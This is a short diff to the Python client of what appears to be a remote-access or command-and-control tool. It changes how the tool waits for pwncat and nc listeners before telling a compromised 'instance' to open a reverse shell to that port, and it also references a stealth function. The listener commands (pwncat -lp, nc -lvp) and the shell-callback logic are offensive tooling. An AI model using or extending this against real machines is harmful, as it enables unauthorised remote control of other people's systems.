@@ -1,4 +1,6 @@
 import errno
+import time
+
 from prompt_toolkit import PromptSession
 from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
 from prompt_toolkit.patch_stdout import patch_stdout
@@ -127,12 +129,20 @@ class App:
     def _do_pwncat(self):
         port = get_open_port()
         open_new_window_with_cmd(f'pwncat -lp {port}', f'pc:{self.selected_instance.username}@{port}')
-        sleep(1)
-        self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))
+        # wait for the pwncat listener to actually start before sending the command
+        start = time.perf_counter()
+        while time.perf_counter() - start < 3:
+            sleep(0.1)
+            if os.system(f'netstat -lant | grep 0.0.0.0:{port}') == 0:
+                self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))
+                return
+        else:
+            logger.warn(f"pwncat didn't start within 3 secs :(")
 
     def _do_open_shell_bash(self):
         port = get_open_port()
         open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{self.selected_instance.username}@{port}')
+        sleep(0.1)  # just wait a tiny bit for nc to start
         self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))
 
     def _do_stealth(self):
